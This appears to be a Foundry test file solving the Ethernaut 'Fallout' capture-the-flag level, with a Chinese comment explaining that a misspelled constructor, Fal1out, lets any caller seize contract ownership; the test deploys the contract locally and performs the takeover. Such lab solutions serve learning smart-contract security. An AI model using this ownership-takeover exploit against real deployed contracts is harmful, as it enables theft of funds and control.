pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";


/** 
 * 解题思路：
 * 合约的构造函数出现了拼写错误，只需要调用 Fal1out 就可以获得合约的 owner 权限
 */
contract FalloutHackTest is Test {
    Fallout public f;
    address hacker = address(hacker);

    function setUp() public {
        f = new Fallout();
        vm.deal(hacker, 1 ether);
    }
    function testFallout() public {
        vm.startPrank(hacker);
        console.log("before hacker, Fallout owner: ");
        console.logAddress(f.owner());

        f.Fal1out{value: 0.0001 ether}();
        
        console.log("after hacker, Fallout owner: ");
        console.logAddress(f.owner());

        vm.stopPrank();
    }
}